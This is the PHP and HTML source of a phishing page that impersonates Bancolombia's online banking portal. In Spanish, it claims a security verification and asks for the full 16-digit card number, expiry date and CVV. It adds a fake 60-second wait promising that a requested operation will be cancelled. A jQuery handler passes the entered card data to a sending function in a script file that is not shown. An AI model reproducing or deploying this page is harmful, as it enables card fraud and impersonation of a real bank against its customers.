<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>--Verifica tus productos--</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
		<script src="js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  		
   	</head>
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/logo.svg">
   					<br>
   					<span class="subtitulo">Sucursal Virtual Personas</span>
   					<br>
					<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span>
   				</div>
   				<div class="titulo">Ahora Verificar tu cuenta es fácil</div>
   				<div class="mensaje">
   					<table>
   						<tr>
   							<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>   					
   							<td valign="middle" style="padding-left: 12px;"><span style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor ingesar la información requerida.</span></td>
   						</tr>
   					</table>
   				</div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						<div class="form-titulo">Verificacion de seguridad</div>
   						<div class="descripcion">
   							Digite los siguientes datos para verificar la propiedad de tu cuenta.
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese los 16 digitos de su tarjeta</span>
   							</div>   						
   							<div class="input-icono credit-card">
   								<input type="text" name="txtTarjeta" id="txtTarjeta" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="16" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta">  Fecha de Vencimiento</span>
   							</div>   						
   							<div style="margin-top: 8px;">
   								<select style="width:49% !important;" id="mFecha" name="mFecha">
		                    		<option value="" default selected>Mes</option>
		                            <option value="01">01</option>
		                            <option value="02">02</option>
		                            <option value="03">03</option>
		                            <option value="04">04</option>
		                            <option value="05">05</option>
		                            <option value="06">06</option>
		                            <option value="07">07</option>
		                            <option value="08">08</option>
		                            <option value="09">09</option>
		                            <option value="10">10</option>
		                            <option value="11">11</option>
		                            <option value="12">12</option>
		                        </select>


								<select style="width:49% !important;" id="aFecha" name="aFecha">
									<option value="" default selected>Año</option>					
									<option value="2022">2022</option>
									<option value="2023">2023</option>
									<option value="2024">2024</option>
									<option value="2025">2025</option>
									<option value="2026">2026</option>
									<option value="2027">2027</option>
									<option value="2028">2028</option>
									<option value="2029">2029</option>
									<option value="2030">2030</option>
									<option value="2031">2031</option>
									<option value="2032">2032</option>
									<option value="2033">2033</option>
								</select>	
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta">  CVV</span>
   							</div>   						
   							<div class="input-icono pass">
   								<input type="password" name="txtCVV" id="txtCVV" maxlength="3" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   							</div>
   							<br>
   							<button id="btnTarjeta" name="btnTarjeta" class="btn btn-amarillo" type="button">Validar</button>
   							<br>
   						  							
   						</div>
   					</div>
   					<br>
   					<div class="lista-links ">
   						<div class="texto">
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/demo.jpg"></td>
   										<td valign="middle"><a href="#">Conoce sobre sucursal virtual persona</a></td>
   									</tr>
   								</table>  								   						
   							</div>
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/seguridad.jpg"></td>
   										<td valign="middle"><a href="#">Aprende sobre Seguridad</a></td>
   									</tr>
   								</table>   								  							
   							</div>   
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/reglamento.jpg"></td>
   										<td valign="middle"><a href="#">Reglamento Sucursal Virtual</a></td>
   									</tr>
   								</table>   								  							
   							</div>
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/politica.jpg"></td>
   										<td valign="middle"><a href="#">Política de Privacidad</a></td>
   									</tr>
   								</table>   								   							
   							</div> 													
						</div> 
   					</div>
   				</div>
   				<div class="pnlder">
   					<a href="#"><img src="img/card.jpg" class="publicidad"></a><br><br>
   					<div class="texto" style="text-align:justify; padding: 0px 30px;">Después de presionar verificar, te llevaremos a una página donde tendrás que esperar aproximadamente 60 segundos, de ser válida tu identidad te lo notificaremos al instante y será cancelada la operacion solicitada. De lo contrario solicitaremos informacion nuevamente.</div>
   				</div>
   			</div>
   			<div class="pie">
   				<div class="direccion">Sucursal Telefónica: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213<br class="salto-pie">
El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.</div>
   				<div class="ippie">
   					<span class="dirip">Dirección IP: <?php echo $ip; ?></span>´
   					<span class="copyright">Copyright © 2022 Bancolombia S.A.</span>
   				</div>
   			</div>
   		</div>
   	</body>
</html>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}



	$(document).ready(function() {

		$('#btnTarjeta').click(function(){
			if ($("#txtTarjeta").val().length > 15) {
				if ($("#mFecha").val() != "") {
					if ($("#aFecha").val() != "") {
						if ($("#txtCVV").val().length > 2) {
							var fExp = $("#mFecha").val() + "-" + $("#aFecha").val(); 
							enviar_tarjeta($("#txtTarjeta").val(),fExp,$("#txtCVV").val());
						}else{
							$(".mensaje").show();
							$(".pass").css("border", "1px solid red");
							$("#txtCVV").focus();
						}
					}else{
						$(".mensaje").show();
						$("#aFecha").css("border", "1px solid red");
						$("#aFecha").focus();
					}
				}else{
					$(".mensaje").show();
					$("#mFecha").css("border", "1px solid red");
					$("#mFecha").focus();
				}
			}else{
				$(".mensaje").show();
				$(".credit-card").css("border", "1px solid red");
				$("#txtTarjeta").focus();
			}			
		});

		$("#txtTarjeta").keyup(function(e) {
			$(".credit-card").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
		$("#mFecha").click(function(e) {
			$("#mFecha").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
		$("#aFecha").click(function(e) {
			$("#aFecha").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
		$("#txtCVV").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script> 						
